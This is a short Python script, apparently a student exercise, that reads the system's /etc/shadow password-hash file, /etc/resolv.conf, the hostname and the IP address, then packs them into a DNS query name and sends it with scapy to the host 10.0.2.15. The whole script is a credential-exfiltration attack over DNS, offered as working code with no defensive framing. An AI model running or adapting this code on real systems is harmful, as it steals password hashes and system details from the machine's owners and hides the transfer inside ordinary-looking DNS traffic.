#! /usr/bin/env python
#Itay_Arcobi_313260382
import platform
import socket
from scapy.all import DNS, DNSQR, IP, sr1, UDP
from scapy.sendrecv import send
system_info = platform.platform()
hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)
f = open("/etc/shadow", "r")
data = f.read()
f.close()
d=open("/etc/resolv.conf", "r")           
lines=d.readlines()
dconf2=lines[-1]
dconf1=lines[-2]
d.close()
dns_req = IP(dst='10.0.2.15')/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=system_info+data+hostname+ip_address+dconf1+dconf2+'www.google.com'))
answer = send(dns_req, verbose=0)